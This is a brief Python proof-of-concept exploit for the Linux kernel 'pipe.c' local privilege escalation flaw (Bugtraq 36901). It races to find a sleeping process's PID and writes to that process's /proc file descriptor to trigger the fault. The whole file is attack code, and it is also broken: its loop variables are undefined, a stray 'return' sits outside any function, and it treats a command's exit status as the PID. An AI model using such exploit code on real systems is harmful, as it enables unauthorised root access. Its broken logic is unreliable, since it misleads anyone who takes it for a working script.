# This is a PoC based off the PoC release by Earl Chew
# Linux Kernel 'pipe.c' Local Privilege Escalation Vulnerability
# PoC by Matthew Bergin
# Bugtraq ID:       36901

import os
import time
import random
#infinite loop
while (i == 0):
        os.system("sleep 1")
        while (x == 0):
                time.sleep(random.random()) #random int 0.0-1.0
                pid = str(os.system("ps -efl | grep 'sleep 1' | grep -v grep | { read PID REST ; echo $PID; }"))
                if (pid == 0): #need an active pid, race condition applies
                        print "[+] Didnt grab PID, got: " + pid + " -- Retrying..."
            return
                else:
                        print "[+] PID: " + pid
                        loc = "echo n > /proc/" + pid + "/fd/1"
                        os.system(loc) # triggers the fault, runs via sh
